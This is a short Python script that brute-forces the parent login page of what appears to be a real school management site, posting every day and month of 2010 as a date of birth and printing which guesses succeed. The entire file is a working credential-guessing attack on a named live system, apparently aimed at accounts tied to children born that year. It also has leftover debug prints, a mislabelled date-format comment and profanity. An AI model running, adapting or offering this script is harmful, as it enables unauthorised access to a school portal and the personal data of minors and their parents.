import requests
from datetime import datetime

# URL of the login endpoint
login_url = "https://kadmaerp.keralapublicschooltrust.com/parent_login"
print("log1")
# Iterate over each day and month combination in 2010
for month in range(1, 13):
    print("log2")
    for day in range(1, 32):
        # Construct the date string
        date_str = f"{day:02d}-{month:02d}-2010"  # Format: YYYY-MM-DD
        print("log3")
        # Example payload for login request
        payload = {
            "dob": date_str  # Assuming the date of birth field is named 'dob'
        }
        print("log4")
        # Send the login request
        response = requests.post(login_url, data=payload)
        print(response)
        if response.status_code == 200:
            print(f"Login successful with date: {date_str}")
        if response.status_code == 420:
            print("FUCK")